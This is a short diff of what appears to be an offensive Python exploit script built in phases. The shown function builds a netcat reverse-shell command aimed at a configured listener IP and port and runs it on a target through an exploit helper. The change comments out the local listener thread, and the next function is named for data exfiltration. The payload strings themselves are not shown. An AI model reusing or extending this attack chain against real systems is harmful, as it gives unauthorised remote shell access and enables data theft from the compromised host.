@@ -35,8 +35,8 @@ def phase_reverse_shell() -> None:
     banner("Phase 3 : Reverse shell")
     #shell_cmd = payloads.bash_reverse_shell(config.LISTENER_IP, config.LISTENER_PORT)
     shell_cmd = payloads.nc_reverse_shell(config.LISTENER_IP, config.LISTENER_PORT)
-    t = threading.Thread(target=listener, daemon=True)
-    t.start()
+    #t = threading.Thread(target=listener, daemon=True)
+    #t.start()
     exploit.run_command(shell_cmd)
 
 def phase_exfiltration() -> None:
